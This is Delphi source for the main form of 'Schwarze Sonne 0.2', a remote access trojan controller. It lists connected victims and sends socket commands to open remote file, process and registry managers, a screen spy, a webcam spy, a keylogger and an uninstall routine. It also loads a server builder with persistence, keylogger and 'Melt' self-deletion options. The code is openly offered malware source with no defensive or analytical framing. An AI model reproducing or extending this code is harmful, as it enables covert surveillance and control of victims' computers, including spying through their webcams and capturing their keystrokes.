
unit MainU;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, ExtCtrls,userv, XPMan, Buttons, PngBitBtn,
  Menus, ImgList, ShellAPI,PngImageList,WinSock, uTransferView,uScreen, uProcess,uCamspy,uAbout,
  jpeg,uConn, uKeylogger,uRegistryeditor,inifiles,uScreenNor;

type
  TButton = class(StdCtrls.TButton)
    OwnedThread: TThread;
    ProgressBar: TProgressBar;
  end;
 
  TMainForm = class(TForm)
    lv1: TListView;
    XPManifest1: TXPManifest;
    PngBitBtn1: TPngBitBtn;
    PngBitBtn2: TPngBitBtn;
    PngBitBtn5: TPngBitBtn;
    edt1: TEdit;
    pm1: TPopupMenu;
    Filemanager1: TMenuItem;
    PngImageList1: TPngImageList;
    Processmanager1: TMenuItem;
    il1: TImageList;
    Screenspy1: TMenuItem;
    Windowmanager1: TMenuItem;
    Webcamspy1: TMenuItem;
    Registrymanager1: TMenuItem;
    Server1: TMenuItem;
    Close1: TMenuItem;
    Uninstall1: TMenuItem;
    img1: TImage;
    shp1: TShape;
    PngBitBtn4: TPngBitBtn;
    Screenspy2: TMenuItem;
    procedure FormCreate(Sender: TObject);
    procedure PngBitBtn1Click(Sender: TObject);
    procedure PngBitBtn4Click(Sender: TObject);
    procedure Filemanager1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure Screenspy1Click(Sender: TObject);
    procedure Processmanager1Click(Sender: TObject);
    procedure Webcamspy1Click(Sender: TObject);
    procedure PngBitBtn2Click(Sender: TObject);
    procedure Windowmanager1Click(Sender: TObject);
    procedure Close1Click(Sender: TObject);
    procedure Uninstall1Click(Sender: TObject);
    procedure PngBitBtn5Click(Sender: TObject);
    procedure Registrymanager1Click(Sender: TObject);
    procedure Screenspy2Click(Sender: TObject);
  private
  public
    
  end;

var
  MainForm: TMainForm;
  ListenThread: TMyThread;
  TrayIconData: TNotifyIconData;
  procedure StartListening(sPort:Integer);
implementation

uses uSettings, uFilemanager, uBuild;

{$R *.dfm}
Function SendData(Sock: TSocket; Text: String): Integer;
Begin
  result := Send(Sock, Text[1], Length(Text), 0);
End;

procedure StartListening(sPort:Integer);
begin
if ListenThread <> nil then begin
ListenThread.Suspend;
ListenThread.Terminate;
Sleep(100);
end;
ListenThread := TMyThread.Create(True);
ListenThread.SetPortTo(sPort);
ListenThread.Resume;
end;
procedure TMainForm.FormCreate(Sender: TObject);
begin
MainForm.Caption := 'Schwarze Sonne 0.2 - Connected Users: 0';
TrayIconData.cbSize := SizeOf(TrayIconData);
TrayIconData.Wnd := Handle;
TrayIconData.uID := 0;
TrayIconData.uFlags := 1 + 2 + 4;
TrayIconData.uCallbackMessage := WM_USER + 2;
TrayIconData.hIcon := mainform.Icon.Handle;
StrPCopy(TrayIconData.szTip, 'Schwarze Sonne');
Shell_NotifyIcon(NIM_ADD, @TrayIconData);
end;

procedure TMainForm.PngBitBtn1Click(Sender: TObject);
var
  Ini: TIniFile;
begin
  try
    Ini := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'Settings.ini');
    with form1 do
    begin
      edt1.Text := Ini.ReadString('Options', 'Port', '1005');
      edt2.Text := Ini.ReadString('Options', 'Password', '1005');
    end;
  finally
    Ini.Free;
  end;
form1.show;
end;

procedure TMainForm.PngBitBtn4Click(Sender: TObject);
begin
Form8.Show;
end;

//thanks to the Coders of Coolvibes for this great function
procedure TMainForm.Filemanager1Click(Sender: TObject);
var
  nFileman :TForm2;
begin
if lv1.Selected = nil then Exit;
if lv1.Selected.SubItems.Objects[0] = nil then begin
  nFileman := tform2.Create(self);
  nFileman.Show;
  nFileman.Caption := 'Filemanager - ' +  lv1.Selected.SubItems.Strings[1];
  nFileman.stat1.Panels.Items[0].Text := lv1.Selected.SubItems.Strings[0];
  nFileman.stat1.Panels.Items[1].Text := lv1.Selected.Caption;
  nFileman.cbb1.Clear;
  lv1.Selected.SubItems.Objects[0] := nFileman;
end else begin
   TForm2(lv1.Selected.SubItems.Objects[0]).Show;
   TForm2(lv1.Selected.SubItems.Objects[0]).cbb1.Clear;
end;
if SendData(StrToInt(lv1.Selected.SubItems.Strings[0]),'12|1'#10) = SOCKET_ERROR then begin
   lv1.Selected.Delete;
   MainForm.Caption := 'Schwarze Sonne 0.2 - Connected Users: ' + IntToStr(MainForm.lv1.Items.Count);
end;
end;
procedure TMainForm.FormShow(Sender: TObject);
begin
Form3.Show;
end;

procedure TMainForm.Screenspy1Click(Sender: TObject);
var
  nFileman :TForm4;
begin
if lv1.Selected = nil then Exit;
if lv1.Selected.SubItems.Objects[1] = nil then begin
  nFileman := tform4.Create(self);
  nFileman.Show;
  nFileman.Caption := 'Screenspy - ' +  lv1.Selected.SubItems.Strings[1];
  nFileman.stat1.Panels.Items[0].Text := lv1.Selected.SubItems.Strings[0];
  nFileman.stat1.Panels.Items[1].Text := lv1.Selected.Caption;
  lv1.Selected.SubItems.Objects[1] := nFileman;
end else begin
   TForm4(lv1.Selected.SubItems.Objects[1]).Show;
end;
end;

procedure TMainForm.Processmanager1Click(Sender: TObject);
var
  nFileman :TForm5;
begin
if lv1.Selected = nil then Exit;
if lv1.Selected.SubItems.Objects[2] = nil then begin
  nFileman := tform5.Create(self);
  nFileman.Show;
  nFileman.Caption := 'Processmanager - ' +  lv1.Selected.SubItems.Strings[1];
  nFileman.stat1.Panels.Items[0].Text := lv1.Selected.SubItems.Strings[0];
  nFileman.stat1.Panels.Items[1].Text := lv1.Selected.Caption;
  lv1.Selected.SubItems.Objects[2] := nFileman;
end else begin
   TForm4(lv1.Selected.SubItems.Objects[2]).Show;
end;
end;

procedure TMainForm.Webcamspy1Click(Sender: TObject);
var
  nFileman :TForm7;
begin
if lv1.Selected = nil then Exit;
if lv1.Selected.SubItems.Objects[3] = nil then begin
  nFileman := tform7.Create(self);
  nFileman.Show;
  nFileman.Caption := 'Webcamspy - ' +  lv1.Selected.SubItems.Strings[1];
  nFileman.stat1.Panels.Items[0].Text := lv1.Selected.SubItems.Strings[0];
  nFileman.stat1.Panels.Items[1].Text := lv1.Selected.Caption;
  lv1.Selected.SubItems.Objects[3] := nFileman;
end else begin
   TForm7(lv1.Selected.SubItems.Objects[3]).Show;
end;
end;

procedure TMainForm.PngBitBtn2Click(Sender: TObject);
var
  Ini: TIniFile;
begin
  try
    Ini := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'Settings.ini');
    with form9 do
    begin
      edt1.Text := Ini.ReadString('Builder', 'IP', '127.0.0.1');
      edt2.Text := Ini.ReadString('Builder', 'Port', '1005');
      edt3.Text := Ini.ReadString('Builder', 'Password', 'password');
      edt4.Text := Ini.ReadString('Builder', 'Filename', 'server.exe');
      edt5.Text := Ini.ReadString('Builder', 'Startupname', 'server.exe');
      edt6.Text := Ini.ReadString('Builder', 'Mutex', 'Slayer616');
      chk1.Checked := Ini.ReadBool('Builder', 'Install?', False);
      
      chk2.Checked := Ini.ReadBool('Builder', 'Startup?', False);
      chk3.Checked := Ini.ReadBool('Builder', 'ActiveX?', False);
      chk4.Checked := Ini.ReadBool('Builder', 'HKCU?', False);
      chk5.Checked := Ini.ReadBool('Builder', 'Unhook?', False);
      chk6.Checked := Ini.ReadBool('Builder', 'Keylogger?', False);
      chk7.Checked := Ini.ReadBool('Builder', 'Melt?', False);
    end;
  finally
    Ini.Free;
  end;
form9.show;
end;

procedure TMainForm.Windowmanager1Click(Sender: TObject);
var
  nFileman :TForm10;
begin
if lv1.Selected = nil then Exit;
if lv1.Selected.SubItems.Objects[4] = nil then begin
  nFileman := tform10.Create(self);
  nFileman.Show;
  nFileman.Caption := 'Keylogger - ' +  lv1.Selected.SubItems.Strings[1];
  nFileman.stat1.Panels.Items[0].Text := lv1.Selected.SubItems.Strings[0];
  nFileman.stat1.Panels.Items[1].Text := lv1.Selected.Caption;
  lv1.Selected.SubItems.Objects[4] := nFileman;
  SendData(StrToInt(lv1.Selected.SubItems.Strings[0]),'31|' + #10)
end else begin
   TForm10(lv1.Selected.SubItems.Objects[4]).Show;
end;
end;

procedure TMainForm.Close1Click(Sender: TObject);
begin
if lv1.Selected = nil then Exit;
  SendData(StrToInt(lv1.Selected.SubItems.Strings[0]),'33|' + #10)
end;

procedure TMainForm.Uninstall1Click(Sender: TObject);
begin
if lv1.Selected = nil then Exit;
  SendData(StrToInt(lv1.Selected.SubItems.Strings[0]),'34|' + #10)
end;

procedure TMainForm.PngBitBtn5Click(Sender: TObject);
begin
Form3.Show;
end;

procedure TMainForm.Registrymanager1Click(Sender: TObject);
var
  nFileman :TForm11;
begin
if lv1.Selected = nil then Exit;
if lv1.Selected.SubItems.Objects[5] = nil then begin
  nFileman := tform11.Create(self);
  nFileman.Show;
  nFileman.Caption := 'Registryeditor - ' +  lv1.Selected.SubItems.Strings[1];
  nFileman.stat1.Panels.Items[0].Text := lv1.Selected.SubItems.Strings[0];
  nFileman.stat1.Panels.Items[1].Text := lv1.Selected.Caption;
  lv1.Selected.SubItems.Objects[5] := nFileman;
end else begin
   TForm11(lv1.Selected.SubItems.Objects[5]).Show;
end;
end;

procedure TMainForm.Screenspy2Click(Sender: TObject);
var
  nFileman :TForm12;
begin
if lv1.Selected = nil then Exit;
if lv1.Selected.SubItems.Objects[6] = nil then begin
  nFileman := tform12.Create(self);
  nFileman.Show;
  nFileman.Caption := 'Screenspy - ' +  lv1.Selected.SubItems.Strings[1];
  nFileman.stat1.Panels.Items[0].Text := lv1.Selected.SubItems.Strings[0];
  nFileman.stat1.Panels.Items[1].Text := lv1.Selected.Caption;
  lv1.Selected.SubItems.Objects[6] := nFileman;
end else begin
   TForm12(lv1.Selected.SubItems.Objects[6]).Show;
end;
end;

end.


